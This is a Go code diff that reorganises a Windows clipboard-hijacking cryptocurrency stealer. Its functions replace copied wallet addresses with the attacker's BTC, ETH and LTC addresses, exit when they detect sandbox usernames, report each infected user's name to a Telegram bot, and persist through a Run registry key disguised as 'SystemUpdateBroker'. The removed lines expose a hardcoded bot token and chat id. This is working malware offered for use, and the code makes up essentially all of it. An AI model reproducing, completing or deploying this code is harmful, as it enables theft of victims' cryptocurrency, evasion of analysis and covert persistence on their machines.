@@ -14,58 +14,23 @@ import (
 	"golang.org/x/sys/windows/registry"
 )
 
+// placeholders for now (except for chat id, bot token and crypto addresses those work)
 const (
-	BTC = "insert btc here"
-	ETH = "insert eth here"
-	LTC = "instert ltc here"
+	Startup  = true
+	avm      = true
+	tg       = true
+	chatid   = "chatid"
+	bottoken = "bottoken"
+	BTC      = "insert btc here"
+	ETH      = "insert eth here"
+	LTC      = "instert ltc here"
 )
 
 func main() {
 
-	user, err := user.Current()
-	if err != nil {
-		log.Fatal(err)
-	}
-
-	bottoken := "8018399354:AAED048K57xNx-8AfaGqhHkzfTa-nZ2tGZA"
-	chatid := "6836733049"
-	message := ("New File ran, Username:" + user.Username + "\n")
-	telegramurl := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", bottoken)
-	data := url.Values{}
-	data.Set("chat_id", chatid)
-	data.Set("text", message)
-	resp, err := http.PostForm(telegramurl, data)
-	if err != nil {
-		fmt.Println("failed too send info too telegram", err)
-	}
-	defer resp.Body.Close()
-
-	blockedusers := map[string]bool{
-		"admin":              true,
-		"administrator":      true,
-		"WDAGUtilityAccount": true,
-	}
-
-	if blockedusers[user.Username] {
-		os.Exit(0)
-	}
-
-	exepath, err := filepath.Abs(os.Args[0])
-	if err != nil {
-		log.Fatal(err)
-	}
-
-	key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE)
-	if err != nil {
-		log.Fatal(err)
-	}
-	defer key.Close()
-
-	err = key.SetStringValue("SystemUpdateBroker", exepath)
-	if err != nil {
-		panic(err)
-	}
-
+	antivm()
+	telegram()
+	startup()
 	clip()
 
 }
@@ -104,4 +69,60 @@ func clip() {
 			clipboard.Set(LTC)
 		}
 	}
+}
+
+func telegram() {
+
+	user, err := user.Current()
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	message := ("New File ran, Username:" + user.Username + "\n")
+	telegramurl := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", bottoken)
+	data := url.Values{}
+	data.Set("chat_id", chatid)
+	data.Set("text", message)
+	resp, err := http.PostForm(telegramurl, data)
+	if err != nil {
+		fmt.Println("failed too send info too telegram", err)
+	}
+	defer resp.Body.Close()
+}
+
+func antivm() {
+	user, err := user.Current()
+	if err != nil {
+		log.Fatal(err)
+	}
+	// yes i know blocking usernames is retarded, ill fix it when i feel like it
+	blockedusers := map[string]bool{
+		"admin":              true,
+		"administrator":      true,
+		"WDAGUtilityAccount": true,
+	}
+
+	if blockedusers[user.Username] {
+		os.Exit(0)
+	}
+}
+
+func startup() {
+
+	exepath, err := filepath.Abs(os.Args[0])
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE)
+	if err != nil {
+		log.Fatal(err)
+	}
+	defer key.Close()
+
+	err = key.SetStringValue("SystemUpdateBroker", exepath)
+	if err != nil {
+		panic(err)
+	}
+
 }
